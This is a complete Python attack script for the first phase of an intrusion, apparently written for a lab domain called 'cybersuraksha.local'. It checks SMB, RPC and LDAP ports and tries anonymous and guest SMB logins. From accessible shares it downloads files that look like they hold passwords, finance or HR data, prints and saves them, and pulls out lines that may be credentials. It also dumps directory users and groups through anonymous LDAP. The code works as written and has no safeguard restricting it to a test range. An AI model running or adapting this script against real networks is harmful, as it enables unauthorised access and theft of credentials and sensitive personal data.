#!/usr/bin/env python3
"""
Phase 1: Reconnaissance and Initial Access (Fixed)
- Removed nmap scan requirements
- Added file content extraction from SMB shares
- More flexible success criteria
Exit Code 0: Success, Exit Code 1: Failure
"""

import sys
import time
import subprocess
import argparse
import socket
import os
import re
import tempfile
from impacket.smbconnection import SMBConnection
try:
    from ldap3 import Server, Connection, ALL, SUBTREE
    LDAP3_AVAILABLE = True
except ImportError:
    LDAP3_AVAILABLE = False
import warnings
warnings.filterwarnings('ignore')

class Phase1Reconnaissance:
    def __init__(self, target_ip, domain="cybersuraksha.local"):
        self.target_ip = target_ip
        self.domain = domain
        self.success_count = 0
        self.total_attempts = 0
        self.discovered_services = []
        self.accessible_shares = []
        self.extracted_credentials = []
        self.downloaded_files = []

    def log_attempt(self, attack_name, success, details=""):
        self.total_attempts += 1
        if success:
            self.success_count += 1
            print(f"[+] {attack_name}: SUCCESS - {details}")
        else:
            print(f"[-] {attack_name}: FAILED - {details}")

    def check_basic_connectivity(self):
        """Check if target is reachable"""
        try:
            print("[*] Checking basic connectivity...")

            # Simple socket connection test
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target_ip, 445))  # SMB port
            sock.close()

            if result == 0:
                self.log_attempt("Basic Connectivity", True, "Target is reachable on port 445")
                return True
            else:
                self.log_attempt("Basic Connectivity", False, "Target not reachable on port 445")
                return False

        except Exception as e:
            self.log_attempt("Basic Connectivity", False, f"Error: {str(e)}")
            return False

    def discover_smb_services(self):
        """Discover SMB services without nmap"""
        try:
            print("[*] Discovering SMB services...")

            # Test common SMB ports
            smb_ports = [139, 445]
            open_ports = []

            for port in smb_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((self.target_ip, port))
                    sock.close()

                    if result == 0:
                        open_ports.append(port)
                        self.discovered_services.append(f"SMB:{port}")

                except Exception:
                    continue

            if open_ports:
                self.log_attempt("SMB Service Discovery", True, f"SMB ports open: {open_ports}")
                return True
            else:
                self.log_attempt("SMB Service Discovery", False, "No SMB ports accessible")
                return False

        except Exception as e:
            self.log_attempt("SMB Service Discovery", False, f"Error: {str(e)}")
            return False

    def test_smb_guest_access(self):
        """Test SMB guest/anonymous access"""
        try:
            print("[*] Testing SMB guest access...")

            # Try anonymous connection
            conn = SMBConnection(self.target_ip, self.target_ip)

            # Test guest login
            try:
                conn.login('', '')  # Anonymous
                self.log_attempt("SMB Anonymous Access", True, "Anonymous SMB access granted")
                guest_access = True
            except:
                try:
                    conn.login('guest', '')  # Guest account
                    self.log_attempt("SMB Guest Access", True, "Guest account access granted")
                    guest_access = True
                except:
                    self.log_attempt("SMB Guest Access", False, "No guest access available")
                    guest_access = False

            if guest_access:
                # Enumerate shares
                self.enumerate_smb_shares(conn)
                conn.close()
                return True
            else:
                return False

        except Exception as e:
            self.log_attempt("SMB Guest Access", False, f"Error: {str(e)}")
            return False

    def enumerate_smb_shares(self, conn):
        """Enumerate SMB shares and extract credentials"""
        try:
            print("[*] Enumerating SMB shares...")

            shares = conn.listShares()
            accessible_shares = []

            for share in shares:
                share_name = share['shi1_netname'][:-1]  # Remove null terminator

                # Skip administrative shares
                if share_name.upper() in ['ADMIN$', 'C$', 'IPC$']:
                    continue

                try:
                    # Test access to share
                    file_list = conn.listPath(share_name, '*')
                    accessible_shares.append(share_name)
                    self.accessible_shares.append(share_name)

                    print(f"[+] Accessible share: {share_name}")

                    # Extract files from this share
                    self.extract_files_from_share(conn, share_name, file_list)

                except Exception as e:
                    print(f"[-] Cannot access share {share_name}: {str(e)}")

            if accessible_shares:
                self.log_attempt("Share Enumeration", True, f"Found {len(accessible_shares)} accessible shares")
                return True
            else:
                self.log_attempt("Share Enumeration", False, "No accessible shares found")
                return False

        except Exception as e:
            print(f"[-] Share enumeration error: {str(e)}")
            return False

    def extract_files_from_share(self, conn, share_name, file_list):
        """Extract interesting files from SMB share"""
        try:
            # Look for interesting file types
            interesting_extensions = ['.txt', '.xml', '.config', '.ini', '.log', '.csv', '.xlsx']
            interesting_keywords = ['password', 'credential', 'account', 'user', 'admin', 'config', 'finance', 'hr']

            for file_info in file_list:
                if file_info.is_directory():
                    continue

                filename = file_info.get_longname()

                # Check if file is interesting
                is_interesting = False

                # Check extension
                for ext in interesting_extensions:
                    if filename.lower().endswith(ext):
                        is_interesting = True
                        break

                # Check keywords in filename
                if not is_interesting:
                    for keyword in interesting_keywords:
                        if keyword in filename.lower():
                            is_interesting = True
                            break

                if is_interesting:
                    print(f"[*] Downloading interesting file: {filename}")
                    self.download_and_analyze_file(conn, share_name, filename)

        except Exception as e:
            print(f"[-] File extraction error: {str(e)}")

    def download_and_analyze_file(self, conn, share_name, filename):
        """Download and analyze file for credentials"""
        try:
            # Create temporary file
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=f'_{filename}')

            # Download file
            with open(temp_file.name, 'wb') as f:
                conn.getFile(share_name, filename, f.write)

            self.downloaded_files.append({'share': share_name, 'filename': filename, 'local_path': temp_file.name})

            # Analyze file content for credentials
            self.analyze_file_for_credentials(temp_file.name, filename)

        except Exception as e:
            print(f"[-] Failed to download {filename}: {str(e)}")

    def analyze_file_for_credentials(self, file_path, filename):
        """Analyze downloaded file and show contents"""
        try:
            print(f"[*] Analyzing {filename}...")

            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            print(f"[+] File content ({len(content)} bytes):")
            print("=" * 60)
            print(content)
            print("=" * 60)

            # Save content to file - FIXED LINE HERE
            # Save content to file - FIXED: First clean the filename
            clean_filename = filename.replace('/', '_').replace('\\', '_')
            output_filename = f"extracted_{clean_filename}"
            with open(output_filename, 'w') as f:
                f.write(f"=== Content from {filename} ===\n")
                f.write(content)

            print(f"[+] Content saved to: {output_filename}")

            # Simple line-by-line analysis for potential credentials
            lines = content.split('\n')
            interesting_lines = []

            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if line and ':' in line and len(line) > 5:
                    # Potential credential line
                    interesting_lines.append(f"Line {line_num}: {line}")

            if interesting_lines:
                print(f"[+] Found {len(interesting_lines)} potential credential lines:")
                for line in interesting_lines[:10]:  # Show first 10
                    print(f"  {line}")
                if len(interesting_lines) > 10:
                    print(f"  ... and {len(interesting_lines) - 10} more")

                # Save interesting lines
                cred_filename = f"potential_creds_{clean_filename}.txt"
                with open(cred_filename, 'w') as f:
                    f.write(f"=== Potential credentials from {filename} ===\n\n")
                    for line in interesting_lines:
                        f.write(f"{line}\n")

                self.extracted_credentials.append({
                    'source_file': filename,
                    'content_file': output_filename,
                    'cred_file': cred_filename,
                    'line_count': len(interesting_lines)
                })

                return True
            else:
                print(f"[-] No obvious credential patterns found in {filename}")
                self.extracted_credentials.append({
                    'source_file': filename,
                    'content_file': output_filename,
                    'line_count': 0
                })
                return True  # Still successful if we extracted the file

        except Exception as e:
            print(f"[-] Error analyzing {filename}: {str(e)}")
            return False

    def save_extracted_credentials(self, source_file, credentials):
        """Save extracted credentials to file for later phases"""
        try:
            with open('phase1_extracted_creds.txt', 'a') as f:
                f.write(f"\n=== Credentials from {source_file} ===\n")

                for cred_type, values in credentials.items():
                    f.write(f"{cred_type}:\n")
                    for value in values:
                        f.write(f"  {value}\n")
                    f.write("\n")

            print(f"[+] Saved credentials from {source_file} to phase1_extracted_creds.txt")

        except Exception as e:
            print(f"[-] Failed to save credentials: {str(e)}")

    def check_rpc_services(self):
        """Check for accessible RPC services (simplified)"""
        try:
            print("[*] Checking RPC services...")

            # Simple port check for RPC
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.target_ip, 135))  # RPC endpoint mapper
                sock.close()

                if result == 0:
                    self.log_attempt("RPC Enumeration", True, "RPC ports accessible: [135]")
                    self.discovered_services.append("RPC:135")
                    return True
                else:
                    self.log_attempt("RPC Enumeration", False, "RPC port 135 not accessible")
                    return False

            except Exception as e:
                self.log_attempt("RPC Enumeration", False, f"RPC connection failed: {str(e)}")
                return False

        except Exception as e:
            self.log_attempt("RPC Enumeration", False, f"Error: {str(e)}")
            return False

    def test_ldap_access(self):
        """Test LDAP access and enumerate objects if accessible"""
        try:
            print("[*] Testing LDAP access...")

            if not LDAP3_AVAILABLE:
                print("[-] ldap3 module not available, trying basic connectivity only")
                return self.test_ldap_connectivity_only()

            # Test LDAP ports and enumerate if accessible
            ldap_configs = [
                {'host': self.target_ip, 'port': 389, 'use_ssl': False, 'name': 'LDAP'},
                {'host': self.target_ip, 'port': 636, 'use_ssl': True, 'name': 'LDAPS'},
                {'host': self.target_ip, 'port': 3268, 'use_ssl': False, 'name': 'Global Catalog'},
            ]

            for config in ldap_configs:
                try:
                    print(f"[*] Trying {config['name']} on port {config['port']}...")

                    # Create server connection
                    server = Server(
                        host=config['host'],
                        port=config['port'],
                        use_ssl=config['use_ssl'],
                        get_info=ALL
                    )

                    # Try anonymous bind
                    conn = Connection(server, auto_bind=True)

                    if conn.bound:
                        self.log_attempt("LDAP Access", True, f"{config['name']} port {config['port']} accessible")
                        self.discovered_services.append(f"LDAP:{config['port']}")

                        # Enumerate LDAP objects
                        self.enumerate_ldap_objects(conn, config['name'])

                        conn.unbind()
                        return True

                except Exception as e:
                    print(f"[-] {config['name']} connection failed: {str(e)}")
                    continue

            self.log_attempt("LDAP Access", False, "No LDAP ports accessible")
            return False

        except Exception as e:
            self.log_attempt("LDAP Access", False, f"Error: {str(e)}")
            return False

    def test_ldap_connectivity_only(self):
        """Fallback LDAP connectivity test without enumeration"""
        try:
            ldap_ports = [389, 636, 3268]

            for port in ldap_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((self.target_ip, port))
                    sock.close()

                    if result == 0:
                        self.log_attempt("LDAP Access", True, f"LDAP port {port} accessible")
                        self.discovered_services.append(f"LDAP:{port}")
                        return True

                except Exception:
                    continue

            return False

        except Exception:
            return False

    def enumerate_ldap_objects(self, conn, ldap_type):
        """Enumerate LDAP objects and save to file"""
        try:
            print(f"[*] Enumerating {ldap_type} objects...")

            # Determine base DN
            base_dn = ""
            if conn.server.info and conn.server.info.naming_contexts:
                base_dn = str(conn.server.info.naming_contexts[0])
            else:
                # Fallback to domain DN
                domain_parts = self.domain.split('.')
                base_dn = ','.join([f"DC={part}" for part in domain_parts])

            print(f"[*] Using base DN: {base_dn}")

            # Search for all objects
            search_filter = "(objectClass=*)"
            attributes = ['distinguishedName', 'objectClass', 'name', 'sAMAccountName', 'userPrincipalName', 'description', 'memberOf']

            conn.search(
                search_base=base_dn,
                search_filter=search_filter,
                search_scope=SUBTREE,
                attributes=attributes,
                size_limit=1000  # Limit to prevent overwhelming
            )

            if conn.entries:
                print(f"[+] Found {len(conn.entries)} LDAP objects")

                # Save LDAP enumeration results
                ldap_filename = f"ldap_enumeration_{ldap_type.lower().replace(' ', '_')}.txt"

                with open(ldap_filename, 'w') as f:
                    f.write(f"=== LDAP Enumeration Results ({ldap_type}) ===\n")
                    f.write(f"Base DN: {base_dn}\n")
                    f.write(f"Total Objects: {len(conn.entries)}\n\n")

                    users_count = 0
                    computers_count = 0
                    groups_count = 0

                    for entry in conn.entries:
                        f.write(f"DN: {entry.distinguishedName}\n")

                        if hasattr(entry, 'objectClass') and entry.objectClass:
                            obj_classes = entry.objectClass.values if hasattr(entry.objectClass, 'values') else [str(entry.objectClass)]
                            f.write(f"Object Classes: {', '.join(obj_classes)}\n")

                            # Count object types
                            if 'user' in obj_classes:
                                users_count += 1
                            elif 'computer' in obj_classes:
                                computers_count += 1
                            elif 'group' in obj_classes:
                                groups_count += 1

                        if hasattr(entry, 'name') and entry.name:
                            f.write(f"Name: {entry.name}\n")

                        if hasattr(entry, 'sAMAccountName') and entry.sAMAccountName:
                            f.write(f"SAM Account: {entry.sAMAccountName}\n")

                        if hasattr(entry, 'userPrincipalName') and entry.userPrincipalName:
                            f.write(f"UPN: {entry.userPrincipalName}\n")

                        if hasattr(entry, 'description') and entry.description:
                            f.write(f"Description: {entry.description}\n")

                        if hasattr(entry, 'memberOf') and entry.memberOf:
                            f.write(f"Member Of: {entry.memberOf}\n")

                        f.write("\n" + "-" * 50 + "\n")

                    # Summary
                    f.write(f"\n=== Summary ===\n")
                    f.write(f"Users: {users_count}\n")
                    f.write(f"Computers: {computers_count}\n")
                    f.write(f"Groups: {groups_count}\n")
                    f.write(f"Other Objects: {len(conn.entries) - users_count - computers_count - groups_count}\n")

                print(f"[+] LDAP enumeration saved to: {ldap_filename}")
                print(f"    Users: {users_count}, Computers: {computers_count}, Groups: {groups_count}")

                # Add to extracted files for success criteria
                self.extracted_credentials.append({
                    'source_file': f"{ldap_type}_enumeration",
                    'content_file': ldap_filename,
                    'line_count': len(conn.entries)
                })

                return True
            else:
                print(f"[-] No LDAP objects found or insufficient permissions")
                return False

        except Exception as e:
            print(f"[-] LDAP enumeration failed: {str(e)}")
            return False

    def run_reconnaissance(self):
        """Execute Phase 1 reconnaissance"""
        print(f"🔍 Starting Phase 1: Reconnaissance against {self.target_ip}")
        print("=" * 60)

        try:
            # Execute reconnaissance techniques
            techniques = [
                self.check_basic_connectivity,
                self.discover_smb_services,
                self.test_smb_guest_access,
                self.check_rpc_services,
                self.test_ldap_access
            ]

            for technique in techniques:
                try:
                    technique()
                    time.sleep(1)  # Brief pause between checks
                except Exception as e:
                    print(f"[-] Technique failed with error: {str(e)}")

            # Calculate success rate
            success_rate = (self.success_count / self.total_attempts * 100) if self.total_attempts > 0 else 0

            print("\n" + "=" * 60)
            print(f"Phase 1 Results: {self.success_count}/{self.total_attempts} successful ({success_rate:.1f}%)")
            print(f"Discovered Services: {len(self.discovered_services)}")
            print(f"Accessible Shares: {len(self.accessible_shares)}")
            print(f"Downloaded Files: {len(self.downloaded_files)}")
            print(f"Extracted Files/Data: {len(self.extracted_credentials)}")

            # Display extracted file summary
            if self.extracted_credentials:
                print("\n[+] File Extraction Summary:")
                for file_info in self.extracted_credentials:
                    print(f"  Source: {file_info['source_file']}")
                    if 'content_file' in file_info:
                        print(f"    Content saved to: {file_info['content_file']}")
                    if file_info.get('line_count', 0) > 0:
                        print(f"    Potential credential lines: {file_info['line_count']}")
                        if 'cred_file' in file_info:
                            print(f"    Credentials saved to: {file_info['cred_file']}")
                    else:
                        print(f"    No obvious credentials found")

            # STRICT SUCCESS CRITERIA: Only succeed if we actually extracted files or data
            files_extracted = len(self.extracted_credentials) > 0

            if files_extracted:
                print("\n[+] PHASE 1 SUCCESS: Successfully extracted files/data")
                print("✅ Files or LDAP data were successfully retrieved and saved")
                return True
            else:
                print("\n[-] PHASE 1 FAILED: No files or data extracted")
                print("❌ Could not access any files from SMB shares or LDAP objects")
                print("💡 Phase 1 requires actual file/data extraction, not just port discovery")
                return False

        except Exception as e:
            print(f"[-] Phase 1 failed with critical error: {str(e)}")
            return False
        finally:
            # Cleanup downloaded files (optional - keep for analysis)
            pass

def main():
    parser = argparse.ArgumentParser(description="Phase 1: Reconnaissance and Initial Access")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-d", "--domain", default="cybersuraksha.local", help="Domain name")

    args = parser.parse_args()

    # Initialize and run reconnaissance
    recon = Phase1Reconnaissance(target_ip=args.target, domain=args.domain)
    success = recon.run_reconnaissance()

    # Exit with proper code for dashboard integration
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()